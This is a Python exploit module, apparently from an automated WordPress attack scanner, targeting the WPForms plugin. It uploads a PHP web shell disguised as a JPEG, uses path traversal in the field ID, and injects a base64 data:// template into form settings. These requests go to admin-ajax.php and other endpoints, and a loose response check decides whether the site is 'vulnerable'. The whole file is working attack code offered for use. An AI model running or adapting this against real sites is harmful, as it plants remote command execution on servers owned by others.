import requests
from core.printmodels import *
import base64

class WPForms_File_RCE:
    def __init__(self):
        self.name = "WPForms File Upload RCE"
        self.description = "WPForms File Upload and Template Injection RCE (2024)"
        self.author = "DrDataYE"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'X-Requested-With': 'XMLHttpRequest'
            }

            php_payload = '<?php system($_GET["cmd"]); ?>'
            encoded_payload = base64.b64encode(php_payload.encode()).decode()

            files = {
                'file': ('shell.php.jpg', php_payload, 'image/jpeg'),
                'form_id': ('', '1'),
                'field_id': ('', '1')
            }

            payloads = [
                {
                    "action": "wpforms_upload_file",
                    "form_id": "1",
                    "field_id": "../../../wp-content/uploads/wpforms/shell",
                    "max_file_number": 1
                },
                {
                    "action": "wpforms_save_form",
                    "form_data": {
                        "fields": {
                            "1": {
                                "type": "file-upload",
                                "extensions": "jpg,php",
                                "max_file_number": 1
                            }
                        },
                        "settings": {
                            "form_template": f"data://text/plain;base64,{encoded_payload}"
                        }
                    }
                }
            ]

            endpoints = [
                f"{site}/wp-admin/admin-ajax.php",
                f"{site}/?wpforms_form_preview=1",
                f"{site}/wp-json/wpforms/v1/forms"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, files=files, data=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('success' in response.text or 'uploaded' in response.text):
                        return PrintSuccess(f"[WPForms-2024] Vulnerable! File upload successful at {endpoint}")

            return PrintFailed("[WPForms-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[WPForms-2024] Error: {str(e)}")
